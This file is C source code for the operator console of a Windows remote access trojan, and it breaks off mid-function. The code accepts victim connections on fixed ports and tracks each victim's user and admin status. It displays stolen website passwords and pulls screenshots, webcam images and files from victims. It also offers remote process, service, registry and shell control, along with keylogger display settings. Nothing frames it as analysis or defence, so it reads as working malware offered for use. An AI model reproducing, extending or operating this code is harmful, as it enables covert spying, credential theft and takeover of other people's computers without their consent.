#include <windows.h>
#include <malloc.h>
#include <WindowsX.h>
#include <richedit.h>
#include <stdio.h>
#include <commctrl.h>
#include <time.h>
#include "MyJPEGHandler.h"
#include "resource.h"
#include "AryanClient.h"
#include "upnpnat.h"

#define Alloc(p,t) (t *)malloc((p)*sizeof(t))
#define For(i,n) for ((i)=0;(i)<(n);(i)++)
#define iFor(n) For (i,n)
#define jFor(n) For (j,n)

struct PACKETHEAD;
HBITMAP ScreenA[1024];
HBITMAP WebA[1024];
#pragma comment(linker,"/FILEALIGN:0x200 /MERGE:.data=.text /MERGE:.rdata=.text /SECTION:.text,EWR /IGNORE:4078")

void SetLogs(char * Time, char * Operation, char * Information, char * Success);
//////////////////////////////////////////////////////////////////////////////// 
//Async Sockets
#define	RATMSG_SOCKET			WM_USER+1
#define	FILEMSG_SOCKET			WM_USER+1

////////////////////////////////////////////////////////////////////////////////
//Keylogger
DWORD dwTextColor = 65280;  
DWORD dwTimeColor = 255;  
DWORD dwTitleColor = 16777215;  
DWORD dwBackColor = 0; 
////////////////////////////////////////////////////////////////////////////////
unsigned short	ServerPort=1000;
SOCKET			hSock;
SOCKET			Client[1024];
SOCKADDR_IN		ServAdr;
WORD			Event;
int				AdrLen=sizeof(sockaddr);
/////////////////////////////////////////////////////////////////////////////////
PACKETHEAD	    Head;
DWORD		    HeadSize=sizeof(PACKETHEAD);

PACKETHEAD		Recv;
DWORD			RecvSize=sizeof(PACKETHEAD);
int				S = 0;
bool			WaitForData = 0;
DWORD           thread;
////////////////////////////////////////////////////////////////////////////////
//File Socket
unsigned short	FilePort=1001;
SOCKET			FSock;
SOCKET			FClient[1024];
SOCKADDR_IN		ServAdress;
int				AdressLen = sizeof(sockaddr);
int				F = 0;
WORD			FEvent;
HWND			Connect;
HINSTANCE		CInst;
FILE * fd[1024];

FILE * ShotA[1024];
FILE * ShotB[1024];
FILE * ShotC[1024];
FILE * ShotD[1024];

FILE * DOWN[1024];
FILE * WebCamPic[1024];
char me [256];
int D = 0;
HANDLE UPLOAD;
int GID = 0;
//////////////////////////////////////////////////////////////////////////////// 
//HWND Handles
HWND hStatus;
HWND hDlg;
HWND HwND;


HWND TASKS[1024];
HWND SHwnd[1024];
HWND KeyHwnd[1024];
HWND FileHwnd[1024];
HWND Screen[1024];
HWND SearchHwnd[1024];
HWND ReName[1024];
HWND PassHwnd[1024];
HWND ServiceHwnd[1024];
HWND RegHwnd[1024];
HWND CmdHwnd[1024];
HWND ProgHwnd[1024];
HWND WebCam[1024];
HWND EditHwnd;
//////////////////////////////////////////////////////////////////////////////// 
HINSTANCE ShInst;
HINSTANCE TaInst;
HINSTANCE KInst;
HINSTANCE FileInst;
HINSTANCE ScreenInst;
HINSTANCE GInstance;
HINSTANCE ReInst;
HINSTANCE SearchInst;
HINSTANCE EditInst;
HINSTANCE PassInst;
HINSTANCE RegInst;
HINSTANCE CmdInst;
HINSTANCE ProgInst;
HINSTANCE CamInst;
//////////////////////////////////////////////////////////////////////////////// 
int port = 0;
int x = 0;
int y = 0;
int z = 0;
int N = 0;
int P = 0;
int Q = 0;
int U = 0;
int SentKb = 0;
int RecvKb = 0;
////////////////////////////////////////////////////////////////////////////////
//Logs Buffers
char Operation[100] = "";
char Result[100] = "";
char * Time;
char Error [10] = "";
////////////////////////////////////////////////////////////////////////////////
char ID [100] = "";
////////////////////////////////////////////////////////////////////////////////
//Task 
int STATE;
////////////////////////////////////////////////////////////////////////////////
//file window handles/Buffers
char LastText [100];
TV_ITEM tvi;
HTREEITEM Selected[1024];
TV_INSERTSTRUCT tvinsert;   // struct to config out tree control
HTREEITEM Parent;           // Tree item handle
HTREEITEM Before;           // .......
HTREEITEM Root;             // .......
HTREEITEM LastSelected;
HIMAGELIST hImageList;      // Image list array hadle
HBITMAP hBitMap;            // bitmap handler
bool flagSelected=false;
char FinalDir [1024] = "";
// for drag and drop
HWND hTree;
//BookMark Tree
TV_ITEM TVI;
HTREEITEM SELECTED;
TV_INSERTSTRUCT TVINSERT;   // struct to config out tree control
HTREEITEM BookRoot;
HTREEITEM BookMark;
HIMAGELIST BookImageList;
HBITMAP hBookMap;
HANDLE CHECK;
////////////////////////////////////////////////////////////////////////////////
TV_ITEM Rtvi;
HTREEITEM RSelected[1024];
TV_INSERTSTRUCT Rtvinsert;   // struct to config out tree control
HTREEITEM RParent;           // Tree item handle
HIMAGELIST RegImageList;      // Image list array hadle
HBITMAP RegBitMap;            // bitmap handler
bool RflagSelected=false;
char RFinalKey [512] = "";
////////////////////////////////////////////////////////////////////////////////
//File
char Copy [100] = "";
char FileName [100] = "";
int J = 2;
int V = 0;
DWORD WINAPI SendFile(LPVOID lpParam);
////////////////////////////////////////////////////////////////////////////////
//WINDOWIP
char WINDOWIP [50] = "";
////////////////////////////////////////////////////////////////////////////////
HIMAGELIST cImageList;
////////////////////////////////////////////////////////////////////////////////
//	Time
void GetTime()
{
  time_t rawtime;
  struct tm * timeinfo;

  time ( &rawtime );
  timeinfo = localtime ( &rawtime );
  
  Time = asctime (timeinfo);

}
////////////////////////////////////////////////////////////////////////////////
//SetListViews
void SetServer(char * Resolution, char * ADMIN, char * CPU, char * RAM, char * ServerVersion, char * User, char * Country, char * OS, char * ID)
{
	LV_ITEM	item;
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	atoi(ID);
	item.iImage = 0;

	item.iSubItem=0;
	item.pszText=ID;
	item.iItem=ListView_InsertItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

//	MessageBox(NULL, ID, "ID", MB_OK);

	item.iSubItem=1;
	item.pszText=User;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
	
	item.iSubItem=2;
	item.pszText=ADMIN;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	item.iSubItem=3;
	item.pszText=Country;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
	
	item.iSubItem=4;
	item.pszText=OS;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	item.iSubItem=5;
	item.pszText=RAM;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	item.iSubItem=6;
	item.pszText=CPU;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
	
	item.iSubItem=7;
	item.pszText=Resolution;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	item.iSubItem=8;
	item.pszText=ServerVersion;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
///////////////////////////////////////////////////////////////
	GetTime();
	SetLogs(Time, "User Connected", User, "Pass");

}
void SetProc(char * Process, char * PID, char * PPID, char * Threads, char * Pri, char * Memory, int ID)
{
	
	char Buffer [50] = "";
    LV_ITEM	 item;
	item.mask=TVIF_TEXT;
	item.iItem=P;

	item.iSubItem=0;
	item.pszText=Process;
	item.iItem=ListView_InsertItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	item.iSubItem=1;
	item.pszText=PID;
	ListView_SetItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	item.iSubItem=2;
	item.pszText=PPID;
	ListView_SetItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	item.iSubItem=3;
	item.pszText=Threads;
	ListView_SetItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	item.iSubItem=4;
	item.pszText=Pri;
	ListView_SetItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	sprintf(Buffer, "Process's: %d", P);
	SendMessage(GetDlgItem(TASKS[ID],IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)Buffer);

	sprintf(Buffer, "Memory Usage: %s%%", Memory);
	SendMessage(GetDlgItem(TASKS[ID],IDC_TASK_STATUS), SB_SETTEXT, 1, (LPARAM)Buffer);


P++;
}
void SetTask(char * Task, char * Memory, int ID)
{
	char Buffer [50] = "";
    LV_ITEM	 item;
	item.mask=TVIF_TEXT;
	item.iItem=0;

	item.iSubItem=0;
	item.pszText=Task;
	item.iItem=ListView_InsertItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	sprintf(Buffer, "Process's: %d", ListView_GetItemCount(GetDlgItem(TASKS[ID],IDC_TASKLIST)));
	SendMessage(GetDlgItem(TASKS[ID],IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)Buffer);
    //MessageBox(NULL, Memory, "Memory", MB_OK);
	sprintf(Buffer, "Memory Usage: %s%%", Memory);
	SendMessage(GetDlgItem(TASKS[ID],IDC_TASK_STATUS), SB_SETTEXT, 1, (LPARAM)Buffer);
}
void SetPasswords(char * URL, char * UserName, char * PassWord ,int ID, int ID2)
{
    LV_ITEM	item;
	item.mask=TVIF_TEXT | LVIF_IMAGE;

	item.iSubItem=0;
	item.pszText=URL;
	item.iImage = ID2; 
	item.iItem=ListView_InsertItem(GetDlgItem(PassHwnd[ID],IDC_PASSWORDS),&item);

	item.iSubItem=1;
	item.pszText=UserName;
	ListView_SetItem(GetDlgItem(PassHwnd[ID],IDC_PASSWORDS),&item);

	item.iSubItem=2;
	item.pszText=PassWord;
	ListView_SetItem(GetDlgItem(PassHwnd[ID],IDC_PASSWORDS),&item);
}
void SetServices(char * ServiceName, char * DisplayName, char * Status , char * StartUp ,int ID)
{

    LV_ITEM	item;
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;

	item.iSubItem=0;
	item.pszText=ServiceName;
	item.iImage = 7;
	item.iItem=ListView_InsertItem(GetDlgItem(ProgHwnd[ID],IDC_SERVICES),&item);

	item.iSubItem=1;
	item.pszText=DisplayName;
	ListView_SetItem(GetDlgItem(ProgHwnd[ID],IDC_SERVICES),&item);

	item.iSubItem=2;
	item.pszText=Status;
	ListView_SetItem(GetDlgItem(ProgHwnd[ID],IDC_SERVICES),&item);

	item.iSubItem=3;
	item.pszText=StartUp;
	ListView_SetItem(GetDlgItem(ProgHwnd[ID],IDC_SERVICES),&item);
}
////////////////////////////////////////////////////////////////////////////////
//Logs
void SetLogs(char * Time, char * Operation, char * Information, char * Success)
{
	LV_ITEM	item;
	item.mask=TVIF_TEXT;
	item.iItem=	0;

	item.iSubItem=0;
	item.pszText=Time;
	item.iItem=ListView_InsertItem(GetDlgItem(HwND,IDC_LOGS),&item);

	item.iSubItem=1;
	item.pszText=Operation;
	ListView_SetItem(GetDlgItem(HwND,IDC_LOGS),&item);
	
	item.iSubItem=2;
	item.pszText=Information;
	ListView_SetItem(GetDlgItem(HwND,IDC_LOGS),&item);

	item.iSubItem=3;
	item.pszText=Success;
	ListView_SetItem(GetDlgItem(HwND,IDC_LOGS),&item);
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Initilise WSA
void InitWSA()
{
	WORD	wVersionRequested;
	WSADATA wsaData;
	int		err;
	wVersionRequested = MAKEWORD( 2, 0 );
    err = WSAStartup( wVersionRequested, &wsaData );
    if ( err != 0 )
		PostQuitMessage(1);

    if ( LOBYTE( wsaData.wVersion ) != 2 ||
		 HIBYTE( wsaData.wVersion ) != 0 )
	{
	    WSACleanup();
		PostQuitMessage(0);
	}
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Initilise Socket for async uses.
bool InitSocket(HWND hwnd)
{
	hSock = socket(AF_INET,SOCK_STREAM,0);
	WSAAsyncSelect(hSock,hwnd,RATMSG_SOCKET,FD_ACCEPT|FD_CLOSE|FD_READ);
	ServAdr.sin_family=AF_INET;
	ServAdr.sin_addr.s_addr=htonl(INADDR_ANY);
	ServAdr.sin_port=htons(ServerPort);
	bind(hSock,(LPSOCKADDR)&ServAdr,sizeof(struct sockaddr));
	listen(hSock, 1);
	return TRUE;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Initilise Socket for async uses.
bool InitiliseSocket(HWND hwnd)
{
	FSock = socket(AF_INET,SOCK_STREAM,0);
	WSAAsyncSelect(FSock,hwnd,FILEMSG_SOCKET,FD_ACCEPT|FD_CLOSE|FD_READ);
	ServAdress.sin_family=AF_INET;
	ServAdress.sin_addr.s_addr=htonl(INADDR_ANY);
	ServAdress.sin_port=htons(FilePort);
	bind(FSock,(LPSOCKADDR)&ServAdress,sizeof(struct sockaddr));
	listen(FSock, 1);
	return TRUE;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//close each socket that has connected
void CloseSocket(HWND hwnd)
{
	closesocket(hSock);
/*  for(int	M; S != M, M++;);
	{
	send(Client[M], "Reset", sizeof("Reset"), 0);
	}*/
	for(int A = 0; S > A, A++;);
	{
	closesocket(Client[A]);
	}

	WSACleanup();
	SendMessage(hwnd, SB_SETTEXT, 0, (LPARAM)"Connection status: Not listening");
}
BOOL ResetProcs(HWND hwnd, int H)
{
if(ListView_DeleteAllItems(GetDlgItem(hwnd,H)))
{
return TRUE;
}
else
{
//MessageBox(NULL, "ERROR RESETTING LIST VIEW!", "ERROR", MB_OK | MB_ICONINFORMATION);
return FALSE;
}
return TRUE;
}
 
/////////////////////////////////////////////////////////////////////////////////////
//Shell Window Call back

/////////////////////////////////////////////////////////////////////////////////////
//Set Files.
BOOL ResetFiles(HWND hwnd)
{
if(ListView_DeleteAllItems(GetDlgItem(hwnd,IDC_FILELIST)))
{
return TRUE;
}
else
{
//MessageBox(NULL, "ERROR RESETTING FILE VIEW!", "ERROR", MB_OK | MB_ICONINFORMATION);
return FALSE;
}
return TRUE;
}
void SetDrive(char * Drive, int ID)
{
			tvinsert.hParent=NULL;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE;
			switch(Recv.ID2)
			{
			case 1:	
			tvinsert.item.iImage=5;
				break;
			case 2:
			tvinsert.item.iImage=1;
				break;
			case 3:
			tvinsert.item.iImage=2;
				break;
			case 4:
			tvinsert.item.iImage=3;
				break;
			case 5:
			tvinsert.item.iImage=4;
				break;
			}

			tvinsert.item.pszText=Drive;
			Parent=(HTREEITEM)SendDlgItemMessage(FileHwnd[ID],IDC_TREE1,TVM_INSERTITEM,0,(LPARAM)&tvinsert);

			Root=Parent;
			tvinsert.item.iImage=1;

}

void SetFile(char * FileName, char * FileSize, int ID, int ID2, int Type) //char * CreationTime, char * LastAccessTime, char * LastWriteTime ,
{


    LV_ITEM	item;
	item.iImage = 0;
	switch(ID2)
	{
	case 1:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;

	item.iSubItem=0;
	item.pszText=FileName;
	item.iImage = Type; 
	item.iItem=ListView_InsertItem(GetDlgItem(FileHwnd[ID],IDC_FILELIST),&item);

	item.iSubItem=1;
	item.pszText=FileSize;

	ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_FILELIST),&item);

	break;

	case 2:
		if(strstr(FileName, ".") || strstr(FileName, ".."))
		{
		break;
		}
	   tvinsert.hParent=Selected[ID];			// top most level no need handle
	   tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
	        tvinsert.item.pszText=FileName;
			tvinsert.item.iImage=8;
			tvinsert.item.iSelectedImage=0;
			RParent=(HTREEITEM)SendDlgItemMessage(FileHwnd[ID],IDC_TREE1,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
			TreeView_Select(GetDlgItem(FileHwnd[ID],IDC_TREE1), Selected[ID], TVGN_CARET);
			TreeView_Expand(GetDlgItem(FileHwnd[ID],IDC_TREE1), Selected[ID], TVM_EXPAND);


	break;
	}
}

void SetTHEBMIHeader (BITMAPINFO *b,short dx,short dy)
{
 b->bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
 b->bmiHeader.biWidth=dx;
 b->bmiHeader.biHeight=-dy;
 b->bmiHeader.biPlanes=1;
 b->bmiHeader.biBitCount=24;
 b->bmiHeader.biCompression=BI_RGB;
 b->bmiHeader.biSizeImage=0;
 b->bmiHeader.biXPelsPerMeter=1;
 b->bmiHeader.biYPelsPerMeter=1;
 b->bmiHeader.biClrUsed=0;
 b->bmiHeader.biClrImportant=0;
}
POINT GetBitmapSize (HBITMAP h)
{
POINT p;
BITMAP o;
GetObject (h,sizeof(o),&o);
p.x=o.bmWidth;
p.y=o.bmHeight;
return (p);
}
void CreateWorkingBitmap (WORD dx,WORD dy,tWorkBMP *w)
{
 w->x=dx;
 w->y=dy;
 w->l=(dx+1)*3&0xfffc;
 w->b=Alloc(w->l*dy,BYTE);
}
void OpenBitmapForWork (HBITMAP b,tWorkBMP *w)
{
BITMAPINFO s;
HDC h=GetDC(NULL);
POINT v=GetBitmapSize(b);
CreateWorkingBitmap (v.x,v.y,w);
SetTHEBMIHeader (&s,w->x,w->y);
GetDIBits (h,b,0,w->y,w->b,&s,DIB_RGB_COLORS);
ReleaseDC (NULL,h);
} 


HBITMAP CreateEmptyBitmap (WORD dx,WORD dy)
{
 HDC h=GetDC(NULL);
 HBITMAP b=CreateCompatibleBitmap(h,dx,dy);
 ReleaseDC (NULL,h);

 return (b);
}


void SaveWorkingBitmap (tWorkBMP *w,HBITMAP b)
{
 BITMAPINFO s;
 HDC h=GetDC(NULL);
 SetTHEBMIHeader (&s,w->x,w->y);
 SetDIBits (h,b,0,w->y,w->b,&s,DIB_RGB_COLORS);
 ReleaseDC (NULL,h);
}

void ShrinkWorkingBitmap (tWorkBMP *a,tWorkBMP *b,WORD bx,WORD by)
{
 BYTE *uy=a->b,*ux,i;
 WORD x,y,nx,ny=0;
 DWORD df=3*bx,nf=df*by,j;
 float k,qx[2],qy[2],q[4],*f=Alloc(nf,float);

 CreateWorkingBitmap (bx,by,b);

 jFor (nf) f[j]=0;
 j=0;

 For (y,a->y) {
  ux=uy;
  uy+=a->l;
  nx=0;
  ny+=by;

  if (ny>a->y) {

   qy[0]=1-(qy[1]=(ny-a->y)/(float)by);

   For (x,a->x) {

    nx+=bx;

    if (nx>a->x) {
     qx[0]=1-(qx[1]=(nx-a->x)/(float)bx);

     iFor (4) q[i]=qx[i&1]*qy[i>>1];

     iFor (3) {
      f[j]+=(*ux)*q[0];
      f[j+3]+=(*ux)*q[1];
      f[j+df]+=(*ux)*q[2];
      f[(j++)+df+3]+=(*(ux++))*q[3];
     }
    }
    else iFor (3) {
     f[j+i]+=(*ux)*qy[0];
     f[j+df+i]+=(*(ux++))*qy[1];
    }
    if (nx>=a->x) nx-=a->x;
     if (!nx) j+=3;
   }
  }
  else {
   For (x,a->x) {

    nx+=bx;

    if (nx>a->x) {
     qx[0]=1-(qx[1]=(nx-a->x)/(float)bx);
     iFor (3) {
      f[j]+=(*ux)*qx[0];
      f[(j++)+3]+=(*(ux++))*qx[1];
     }
    }
    else iFor (3) f[j+i]+=*(ux++);

    if (nx>=a->x) nx-=a->x;
     if (!nx) j+=3;
   }
   if (ny<a->y) j-=df;
  }
  if (ny>=a->y) ny-=a->y;
 }

 nf=0;
 k=bx*by/(float)(a->x*a->y);
 uy=b->b;

 For (y,by) {
  jFor (df) uy[j]=f[nf++]*k+.5;
  uy+=b->l;
 }

 free (f);
}

HBITMAP ShrinkBitmap (HBITMAP a,WORD bx,WORD by)
// creates and returns new bitmap with dimensions of
// [bx,by] by shrinking bitmap a both [bx,by] must be less or equal
// than the dims of a, unless the result is nonsense
{
 tWorkBMP in,out;
 HBITMAP b=CreateEmptyBitmap(bx,by);
 OpenBitmapForWork (a,&in);
 ShrinkWorkingBitmap (&in,&out,bx,by);
 free (in.b);
 SaveWorkingBitmap (&out,b);
 free (out.b);
 return (b);
}
LPPICTURE gpPicture;

DWORD WINAPI Draw(LPVOID lParam)
{
    
    mystruct * MS = (mystruct *)lParam;
	RECT rc;
//    LVBKIMAGE IBBkImg;
	HBITMAP Final = MS ->Screen;
	HDC hdcBackground;
	INT ndcBackground;
	HDC hdc = 0;
	HDC hdcScreen;
	
	PAINTSTRUCT ps;
	HBITMAP hbmMem;
	INT ndcMem;
	HDC hdcMem;

	int ID3 = MS->ID3;
	int ID4 = MS->ID4;
	int ID = MS->ID;
	//ID = (int)lParam;
				if(Screen[ID] == NULL)
				{
				return 1;
				}
        GetClientRect(Screen[ID], (LPRECT) &rc);
        if(Final == NULL) return -1;
		hdcScreen = GetDC(HWND_DESKTOP);
    	hdcBackground = CreateCompatibleDC(hdcScreen);
		ndcBackground = SaveDC(hdcBackground);
		SelectObject(hdcBackground, Final);
		ReleaseDC(HWND_DESKTOP, hdcScreen); 
							if(Screen[ID] == NULL)
				{
				return 1;
				}
								if(Screen[ID] == NULL)
				{
				return 1;
				}
					UpdateWindow (Screen[ID]);


				if(Screen[ID] == NULL)
				{
				return 1;
				}
				   if(BeginPaint(Screen[ID], &ps)) 
					{
				
									if(Screen[ID] == NULL)
				{
				return 1;
				}
					// Create double buffer
					hdcMem = CreateCompatibleDC(ps.hdc);
					ndcMem = SaveDC(hdcMem);
					hbmMem = CreateCompatibleBitmap(ps.hdc, ID3, ID4);
					SelectObject(hdcMem, hbmMem);
				if(Screen[ID] == NULL)
				{
				return 1;
				}
					// Copy background bitmap into double buffer
			     	if(BitBlt(hdcMem, 0, 0, ID3, ID4, hdcBackground, 0, 0, SRCCOPY) == NULL)
					{
					//MessageBox(NULL, "failed", "FAILED", MB_OK);
					}
					//StretchBlt(ps.hdc, 0, 0, rc.right, rc.bottom - 10, hdcMem,  0, 0,  ID3, ID4, SRCCOPY);
					//Copy double buffer to screen
				    if(BitBlt(ps.hdc, 0, 0, ID3, ID4, hdcMem, 0, 0, SRCCOPY) == NULL)
					{
					//	MessageBox(NULL, "failed Screen", "FAILED", MB_OK);
					 }
				if(Screen[ID] == NULL)
				{
				return 1;
				}
					// Clean up
				    RestoreDC(hdcMem, ndcMem);
					DeleteObject(hbmMem);
					DeleteObject(Final);
					DeleteDC(hdcMem);
					DeleteDC(hdcScreen);
					DeleteDC(hdc);
					EndPaint(Screen[ID], &ps);

					}
return 0;
}

////////////////////////////////////////////////////////////////////////////////////
//File Window Call back's
LRESULT CALLBACK FileConnectProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
PACKETFRECV DL;
//mystruct MS;
DWORD		DLSize = sizeof(PACKETFRECV);
char FileName [100] = "";
int	i = 0;
int j = 0;
int Select = 0;
char FilePathA[256] = "";
HMODULE getmodh;
//LVBKIMAGE IBBkImg;
LV_ITEM	 item;
char Name [50] = "";
char Buffer [512] = "";
RECT rc;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
			if(InitiliseSocket(hwnd))		
			 {
	         }
			 else
			 {
		// MessageBox(NULL, "FAIL InitiliseSocket", "InitiliseSocket", MB_OK);
			 }
			 		getmodh = GetModuleHandle(NULL);
					GetModuleFileName(getmodh,me,sizeof(me));
					
					
		break;
					 
	case FILEMSG_SOCKET:
		FEvent=WSAGETSELECTEVENT(lParam);
		switch(FEvent)
		{
		case FD_CLOSE:
			break;
/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_ACCEPT:
			while(FClient[F] != NULL)
			{
			F++;
			}
			FClient[F]=accept(wParam,(LPSOCKADDR)&ServAdr,&AdrLen);
			break;
/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_READ:
			ZeroMemory(&DL, sizeof(PACKETFRECV));
			RecvKb+=recv(wParam,(char*)&DL,DLSize,0);
			switch(DL.PacketType)
			{
			   case PACKET_FILE_MANAGER_FILE_RECV:
				   if(DOWN[DL.ID2] == NULL)
				   {
					//MessageBox(NULL, "cant find file", "FRecv.Data", MB_OK);
					break;
				   }

					fwrite(DL.Data, DL.ID3, 1, DOWN[DL.ID2]);
					break;
			   case PACKET_FILE_MANAGER_FILE_UPDATE_WIN:
				    item.mask=TVIF_TEXT;
					item.iItem=DL.ID3;

					item.iSubItem=2;
					item.pszText=DL.Data;
					ListView_SetItem(GetDlgItem(FileHwnd[DL.ID],IDC_DOWNLOADS),&item);
				    break;
		       case PACKET_FILE_MANAGER_FILE_C:
				      if(DOWN[DL.ID2] == NULL)
				   {
					MessageBox(NULL, "cant find file", "FRecv.Data", MB_OK);
					break;
				   }
					fclose(DOWN[DL.ID2]);
					item.mask=TVIF_TEXT;
					item.iItem=DL.ID3; 
					item.iSubItem=2;
					item.pszText="Completed";
					ListView_SetItem(GetDlgItem(FileHwnd[DL.ID],IDC_DOWNLOADS),&item);
					break;

			  case SCREEN_SHOT_OPEN:
				  if(DL.ID4 == 1)
				  {
				   SendMessage(GetDlgItem(WebCam[Recv.ID],IDC_PROGRESS1), PBM_SETRANGE32 , 0, DL.ID2);
				   sprintf(Name, "Cam%d.jpeg", DL.ID);
				   WebCamPic[DL.ID] = fopen(Name, "wb");
				   	 if(WebCamPic[DL.ID] == NULL)
				   {
					sprintf(Name, "WebCamPic[%d]", DL.ID);
					//MessageBox(NULL, Name, "Data", MB_OK);
					break;
				   }
				   break;
				  }
				  else
				  {
				   SendMessage(GetDlgItem(Screen[Recv.ID],IDC_PROGRESS), PBM_SETRANGE32 , 0, DL.ID2);
				   sprintf(Name, "Screeny%d.jpeg", DL.ID);
				   ShotA[DL.ID] = fopen(Name, "wb");
				  }
				   break;

			   case SCREEN_SHOT_RECV:
				  if(DL.ID4 == 1)
				  {
					SendMessage(GetDlgItem(WebCam[DL.ID],IDC_PROGRESS1), PBM_SETPOS , (WPARAM)DL.ID2, 0);
					if(WebCamPic[DL.ID] == NULL)
				   {
					sprintf(Name, "WebCamPic[%d]", DL.ID);
				//	MessageBox(NULL, Name, "Data", MB_OK);
					break;
				   }
					fwrite(DL.Data, DL.ID3, 1, WebCamPic[DL.ID]);
					break;
				  }
				    
				  SendMessage(GetDlgItem(Screen[DL.ID],IDC_PROGRESS), PBM_SETPOS , (WPARAM)DL.ID2, 0);
					if(ShotA[DL.ID] == NULL)
				   {
					sprintf(Name, "%d", DL.ID4);
				//	MessageBox(NULL, Name, "Data", MB_OK);
				//	MessageBox(NULL, "cant find file Screen A", "DL.Data", MB_OK);
					break;
				   }
					fwrite(DL.Data, DL.ID3, 1, ShotA[DL.ID]);
				   break;

			   case SCREEN_SHOT_CLOSE:
				   if(DL.ID2 == 1)
				   {
					 if(WebCamPic[DL.ID] == NULL)
				   {
					sprintf(Name, "WebCamPic[%d]", DL.ID);
				//	MessageBox(NULL, Name, "Data", MB_OK);
					break;
				   }
				   SendMessage(GetDlgItem(WebCam[DL.ID],IDC_PROGRESS1), PBM_SETPOS , (WPARAM)0, 0);
					fclose(WebCamPic[DL.ID]);
					WebCamPic[DL.ID] = 0;
				  //ShellExecute(NULL, "open", DL.Data, NULL, NULL, SW_SHOWNORMAL);
					sprintf(Name, "Cam%d.jpeg", DL.ID);
				//   ShellExecute(NULL, "open",Name, NULL, NULL, SW_HIDE);
				   WebA[DL.ID] = LoadJPEG(Name);
				   InvalidateRect (WebCam[DL.ID], NULL, FALSE);
				   DeleteFile(Name);
					if(WebCam[DL.ID] == NULL)
					{
					break;
					}
					GetClientRect(WebCam[DL.ID], (LPRECT) &rc);
				   	Head.PacketType = WEBCAM_CAPTURE;
					while(send(Client[DL.ID],(char*)&Head,HeadSize,0) == SOCKET_ERROR)
					{
					Sleep(1000);
					}
					break;
				   }
///////////////////////////////////////////////////////////////////////////////////////////
//
				   if(ShotA[DL.ID] == NULL)
				   {
					Sleep(1000);
					GetClientRect(Screen[DL.ID], (LPRECT) &rc);
					Head.PacketType = SCREEN_CAPTURE;
					Head.ID3 = SendMessage(GetDlgItem(Screen[DL.ID], IDC_SLIDER1), TBM_GETPOS,NULL,NULL);
					Head.ID2 = rc.right - 25;
					sprintf(Head.IDS, "%d", rc.bottom - 10);
					return 0;
				   }
					if(Screen[DL.ID] == NULL)
					{
					return 0;
					}
				   SendMessage(GetDlgItem(Screen[DL.ID],IDC_PROGRESS), PBM_SETPOS , (WPARAM)0, 0);
					fclose(ShotA[DL.ID]);
					ShotA[DL.ID] = 0;
				  //ShellExecute(NULL, "open", DL.Data, NULL, NULL, SW_SHOWNORMAL);
					sprintf(Name, "Screeny%d.jpeg", DL.ID);
				 //	 ShellExecute(NULL, "open",Name, NULL, NULL, SW_HIDE);
				   ScreenA[DL.ID] = LoadJPEG(Name);
				   InvalidateRect (Screen[DL.ID], NULL, FALSE);
				   DeleteFile(Name);
				  // CreateThread(NULL, 0, Draw,(LPVOID)&MS, 0, &thread);
			  if(Screen[DL.ID] == NULL)
				{
				break;
				}
			        
					//Sleep(1000);
					GetClientRect(Screen[DL.ID], (LPRECT) &rc);
					Head.PacketType = SCREEN_CAPTURE;
					Head.ID3 = SendMessage(GetDlgItem(Screen[DL.ID], IDC_SLIDER1), TBM_GETPOS,NULL,NULL);
					Head.ID2 = rc.right - 25;
					sprintf(Head.IDS, "%d", rc.bottom - 10);
    
					Head.ID3 = SendMessage(GetDlgItem(Screen[DL.ID], IDC_SLIDER1), TBM_GETPOS,NULL,NULL);
					while(send(Client[DL.ID],(char*)&Head,HeadSize,0) == SOCKET_ERROR)
					{
					Sleep(1000);
					}
				   break;
			}
            break;
		}
	break;

	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{	
		case IDCANCEL:
			        EndDialog(hwnd,Select);
					break;
		}
		return TRUE;
	}
	return 0;
}
/////////////////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK RenameProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int  Select = 0;
	int K = 0;
	int W = 0;
    char WindowOut [10] = "";
	char WindowOutY [10] = "";
	char NewName [256] =  "";
	HWND file = 0;
    
	LV_ITEM		item;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		//ShowWindow(hwnd,SW_SHOW);
		if(V == 1)
		{
	    SetWindowText(GetDlgItem(hwnd, IDC_NAME), Copy);
		}
		else
